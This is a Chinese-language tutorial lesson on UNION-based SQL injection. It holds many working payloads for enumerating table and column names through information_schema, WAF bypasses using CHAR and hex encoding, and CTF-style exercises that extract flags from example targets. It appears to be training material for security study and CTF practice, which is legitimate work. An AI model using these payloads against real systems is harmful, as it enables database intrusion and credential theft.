# Day 19：爆表名和字段名——高效获取数据库结构

> **学习目标**：掌握高效获取表名和字段名的技巧，提高SQL注入效率
> 
> **学习时长**：2小时
> 
> **难度等级**：⭐⭐⭐⭐

---

## 📚 今日内容概览

1. 高效爆表名技巧
2. 高效爆字段名技巧
3. 常用Payload总结
4. 实战练习
5. 技巧对比

---

## 一、高效爆表名技巧

### 1.1 方法一：GROUP_CONCAT一次性获取

```
方法：
  使用GROUP_CONCAT将所有表名合并成一行
  
Payload：
  ?id=-1 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()--
  
优点：
  - 一次请求获取所有表名
  - 效率高
  - 方便查看

缺点：
  - 结果可能被截断（GROUP_CONCAT长度限制）
  - 表名太多时显示不全

示例：
  注入：?id=-1 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()--
  响应：users,products,flag,secrets,logs
```

### 1.2 方法二：LIMIT分页获取

```
方法：
  使用LIMIT分页，逐页获取表名
  
Payload：
  ?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database() LIMIT 0,1--
  ?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database() LIMIT 1,1--
  ?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database() LIMIT 2,1--
  
优点：
  - 可以获取所有表名
  - 不受GROUP_CONCAT长度限制

缺点：
  - 需要多次请求
  - 效率较低

示例：
  注入1：?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database() LIMIT 0,1--
  响应：users
  
  注入2：?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database() LIMIT 1,1--
  响应：products
```

### 1.3 方法三：CHAR函数绕过过滤

```
方法：
  使用CHAR函数拼接表名，绕过WAF过滤
  
Payload：
  ?id=-1 UNION SELECT 1,GROUP_CONCAT(CHAR(117,115,101,114,115)),3--
  
优点：
  - 绕过WAF对关键字的过滤
  - 隐蔽性高

缺点：
  - 需要知道表名的ASCII码
  - 操作复杂

示例：
  CHAR(117,115,101,114,115) = 'users'
  注入：?id=-1 UNION SELECT 1,GROUP_CONCAT(CHAR(117,115,101,114,115)),3--
```

### 1.4 方法四：使用十六进制编码

```
方法：
  使用十六进制编码绕过过滤
  
Payload：
  ?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=0x637466--
  
优点：
  - 绕过字符串过滤
  - 简单方便

缺点：
  - 需要转换十六进制
  - 可读性差

示例：
  0x637466 = 'ctf'
  注入：?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=0x637466--
```

---

## 二、高效爆字段名技巧

### 2.1 方法一：GROUP_CONCAT一次性获取

```
方法：
  使用GROUP_CONCAT将所有字段名合并成一行
  
Payload：
  ?id=-1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users'--
  
优点：
  - 一次请求获取所有字段名
  - 效率高

缺点：
  - 结果可能被截断
  - 需要知道表名

示例：
  注入：?id=-1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users'--
  响应：id,username,password,email,created_at
```

### 2.2 方法二：LIMIT分页获取

```
方法：
  使用LIMIT分页，逐页获取字段名
  
Payload：
  ?id=-1 UNION SELECT 1,COLUMN_NAME,3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users' LIMIT 0,1--
  ?id=-1 UNION SELECT 1,COLUMN_NAME,3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users' LIMIT 1,1--
  
优点：
  - 可以获取所有字段名
  - 不受长度限制

缺点：
  - 需要多次请求

示例：
  注入1：?id=-1 UNION SELECT 1,COLUMN_NAME,3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users' LIMIT 0,1--
  响应：id
  
  注入2：?id=-1 UNION SELECT 1,COLUMN_NAME,3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users' LIMIT 1,1--
  响应：username
```

### 2.3 方法三：同时获取字段名和数据类型

```
方法：
  使用CONCAT同时获取字段名和数据类型
  
Payload：
  ?id=-1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME,':',DATA_TYPE),3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users'--
  
优点：
  - 获取字段名的同时知道数据类型
  - 方便后续构造Payload

缺点：
  - 结果更长，更容易被截断

示例：
  注入：?id=-1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME,':',DATA_TYPE),3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users'--
  响应：id:int,username:varchar,password:varchar
```

### 2.4 方法四：使用LIKE模糊查询

```
方法：
  使用LIKE模糊查询查找特定字段
  
Payload：
  ?id=-1 UNION SELECT 1,COLUMN_NAME,3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users' AND COLUMN_NAME LIKE '%pass%'--
  
优点：
  - 快速定位目标字段
  - 不需要知道完整字段名

缺点：
  - 需要知道关键字
  - 可能漏查

示例：
  注入：?id=-1 UNION SELECT 1,COLUMN_NAME,3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users' AND COLUMN_NAME LIKE '%pass%'--
  响应：password
  
  注入：?id=-1 UNION SELECT 1,COLUMN_NAME,3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users' AND COLUMN_NAME LIKE '%flag%'--
  响应：flag_content
```

---

## 三、常用Payload总结

### 3.1 爆表名Payload

```
1. 一次性获取当前数据库所有表名：
   ?id=-1 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()--

2. 分页获取当前数据库表名：
   ?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database() LIMIT 0,1--

3. 获取指定数据库的表名：
   ?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='ctf'--

4. 获取所有数据库的所有表名：
   ?id=-1 UNION SELECT 1,CONCAT(TABLE_SCHEMA,':',TABLE_NAME),3 FROM information_schema.TABLES--

5. 使用十六进制：
   ?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=0x637466--
```

### 3.2 爆字段名Payload

```
1. 一次性获取指定表的所有字段名：
   ?id=-1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users'--

2. 分页获取字段名：
   ?id=-1 UNION SELECT 1,COLUMN_NAME,3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users' LIMIT 0,1--

3. 获取字段名和数据类型：
   ?id=-1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME,':',DATA_TYPE),3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users'--

4. 模糊查询字段名：
   ?id=-1 UNION SELECT 1,COLUMN_NAME,3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users' AND COLUMN_NAME LIKE '%key%'--

5. 获取指定数据库和表的字段名：
   ?id=-1 UNION SELECT 1,COLUMN_NAME,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='ctf' AND TABLE_NAME='flag'--
```

### 3.3 字符型注入Payload

```
1. 爆表名：
   ?username=admin' UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()--

2. 爆字段名：
   ?username=admin' UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users'--

3. 双引号闭合：
   ?username=admin" UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()--
```

---

## 四、实战练习

### 4.1 练习1：完整爆表名和字段名

```
题目：
  URL：http://example.com/user?id=1
  已知存在数字型注入，表有3列
  
步骤：
  1. 获取当前数据库名：
     ?id=-1 UNION SELECT 1,database(),3--
     结果：ctf
  
  2. 获取所有表名：
     ?id=-1 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()--
     结果：users,flag,products
  
  3. 获取users表的字段名：
     ?id=-1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users'--
     结果：id,username,password
  
  4. 获取flag表的字段名：
     ?id=-1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM information_schema.COLUMNS WHERE TABLE_NAME='flag'--
     结果：id,flag_content
  
  5. 获取flag内容：
     ?id=-1 UNION SELECT 1,flag_content,3 FROM flag--
     结果：flag{table_column_success}
```

### 4.2 练习2：字符型注入

```
题目：
  URL：http://example.com/login?username=admin
  已知存在字符型注入（单引号闭合），表有2列
  
步骤：
  1. 获取当前数据库名：
     ?username=admin' UNION SELECT 1,database()--
     结果：security
  
  2. 获取所有表名：
     ?username=admin' UNION SELECT 1,GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()--
     结果：users,secrets,logs
  
  3. 获取secrets表的字段名：
     ?username=admin' UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME='secrets'--
     结果：id,secret_key,value
  
  4. 获取secret内容：
     ?username=admin' UNION SELECT 1,value FROM secrets WHERE secret_key='flag'--
     结果：flag{character_injection}
```

### 4.3 练习3：分组获取表名

```
题目：
  URL：http://example.com/api/data?id=1
  GROUP_CONCAT被限制，需要分页获取
  
步骤：
  1. 获取表的总数：
     ?id=-1 UNION SELECT 1,COUNT(TABLE_NAME),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()--
     结果：5
  
  2. 分页获取表名：
     ?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database() LIMIT 0,1-- → users
     ?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database() LIMIT 1,1-- → products
     ?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database() LIMIT 2,1-- → flag
     ?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database() LIMIT 3,1-- → logs
     ?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database() LIMIT 4,1-- → config
  
  3. 获取flag表的字段名：
     ?id=-1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM information_schema.COLUMNS WHERE TABLE_NAME='flag'--
     结果：id,flag
  
  4. 获取flag：
     ?id=-1 UNION SELECT 1,flag,3 FROM flag--
     结果：flag{pagination_success}
```

---

## 五、技巧对比

### 5.1 方法对比表

| 方法 | 优点 | 缺点 | 适用场景 |
|:---|:---|:---|:---|
| GROUP_CONCAT | 一次获取，效率高 | 可能被截断 | 表名/字段名较少时 |
| LIMIT分页 | 可以获取全部 | 需要多次请求 | 表名/字段名较多时 |
| CHAR函数 | 绕过WAF | 操作复杂 | WAF拦截关键字时 |
| 十六进制 | 绕过过滤 | 可读性差 | 字符串被过滤时 |
| LIKE模糊查询 | 快速定位 | 可能漏查 | 查找特定字段时 |

### 5.2 选择建议

```
选择策略：
  1. 先尝试GROUP_CONCAT
  2. 如果被截断，使用LIMIT分页
  3. 如果被WAF拦截，使用CHAR或十六进制
  4. 如果只需要特定字段，使用LIKE模糊查询

效率对比：
  GROUP_CONCAT > LIKE模糊查询 > LIMIT分页 > CHAR/十六进制

推荐顺序：
  1. GROUP_CONCAT一次性获取
  2. 如果结果不全，使用LIMIT分页
  3. 如果被过滤，使用编码绕过
```

---

## 六、常见问题解决

### 6.1 问题1：GROUP_CONCAT被截断

```
现象：
  返回的表名或字段名不完整

解决方法：
  1. 使用LIMIT分页获取
  2. 修改GROUP_CONCAT长度（需要权限）
  3. 使用SUBSTRING分段获取

示例：
  ?id=-1 UNION SELECT 1,SUBSTRING(GROUP_CONCAT(TABLE_NAME),1,50),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()--
  ?id=-1 UNION SELECT 1,SUBSTRING(GROUP_CONCAT(TABLE_NAME),51,100),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()--
```

### 6.2 问题2：information_schema被禁用

```
现象：
  查询information_schema时返回空或报错

解决方法：
  1. 使用SHOW语句：
     ?id=-1; SHOW TABLES--
     ?id=-1; SHOW COLUMNS FROM users--
  2. 使用其他系统表（如果可用）
  3. 尝试盲注

示例：
  ?id=-1; SHOW TABLES--
  ?id=-1; SHOW COLUMNS FROM users--
```

### 6.3 问题3：表名或字段名包含特殊字符

```
现象：
  查询时因为特殊字符报错

解决方法：
  1. 使用反引号包裹：
     ?id=-1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM information_schema.COLUMNS WHERE TABLE_NAME=`user-info`--
  2. 使用十六进制编码：
     ?id=-1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM information_schema.COLUMNS WHERE TABLE_NAME=0x757365722d696e666f--

示例：
  表名user-info的十六进制：0x757365722d696e666f
  注入：?id=-1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM information_schema.COLUMNS WHERE TABLE_NAME=0x757365722d696e666f--
```

---

## 七、今日总结

### 7.1 知识点回顾

```
✅ 高效爆表名技巧
  - GROUP_CONCAT一次性获取
  - LIMIT分页获取
  - CHAR函数绕过
  - 十六进制编码

✅ 高效爆字段名技巧
  - GROUP_CONCAT一次性获取
  - LIMIT分页获取
  - 同时获取字段名和数据类型
  - LIKE模糊查询

✅ 常用Payload总结
  - 数字型注入Payload
  - 字符型注入Payload

✅ 实战练习
  - 完整爆表名和字段名流程
  - 分组获取表名

✅ 方法对比
  - 各种方法的优缺点
  - 选择建议
```

### 7.2 关键记忆点

```
记住这个口诀：

爆表名，GROUP_CONCAT最方便，一次请求全出现；
如果截断用LIMIT，分页获取不麻烦；
爆字段，同样方法来实现，数据类型也能见；
WAF拦截不用怕，CHAR编码来化解！

推荐流程：
  GROUP_CONCAT → LIMIT分页 → 编码绕过
```

### 7.3 今日作业

```
必做题：
  1. 完成三个练习题目
  2. 记录爆表名和字段名的步骤
  3. 获取Flag

选做题：
  1. 练习不同方法的对比
  2. 尝试绕过WAF
  3. 在CTFHub找题目练习

提交内容：
  - 步骤记录
  - Flag截图
  - 方法对比总结
```

### 7.4 明日预告

```
Day 20：报错注入

学习内容：
  - 报错注入原理
  - 常用报错函数
  - 实战练习
```

---

**恭喜你完成Day 19的学习！明天学习报错注入！** 🎉
